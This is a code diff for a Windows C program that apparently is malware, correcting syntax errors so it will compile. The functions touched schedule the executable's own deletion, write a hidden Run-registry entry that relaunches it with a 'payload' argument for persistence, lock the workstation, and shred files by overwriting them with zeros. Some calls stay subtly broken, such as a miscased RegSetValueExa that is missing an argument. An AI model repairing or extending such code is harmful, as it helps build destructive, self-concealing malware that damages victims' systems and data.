@@ -18,7 +18,7 @@
 void self_del_new() {
     char exepath[MAX_PATH];
     if (GetModuleFileNameA(NULL, exepath, MAX_PATH)) {
-        MoveFileExA(exepath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)
+        MoveFileExA(exepath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
     }
 }
 bool admin_check() {
@@ -56,15 +56,16 @@ void task_sch_logon() {
     char exepath[MAX_PATH];
 
     //get current exe
-    GetModuleFileNameA(NULL, exepath, MAX_PATH)
+    GetModuleFileNameA(NULL, exepath, MAX_PATH);
 
     char cmd_payload[MAX_PATH + 10];
     sprintf(cmd_payload, "\"%s\" payload", exepath);
 
-    RegOpenKeyExa(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-    0, KEY_SET_VALUE, &hKey) {
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
         RegSetValueExa(hKey, rand_nm, 0, (const BYTE*)cmd_payload, (DWORD)strlen(cmd_payload) + 1);
-        RegCloseKey(hKey);
+        RegCloseKey(hKey); 
     }
 }
 
@@ -146,7 +147,7 @@ void safe() {
 
 }
 void game() {
-    LockWorkStation():
+    LockWorkStation();
     
     SetConsoleTitleA("Screen");
 
@@ -203,7 +204,7 @@ void shred_file(const char* filepath) {
     SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
 
     LONGLONG remaining = file_size.QuadPart;
-    Dword written;
+    DWORD written;
 
     // zero it
     while (remaining > 0) {
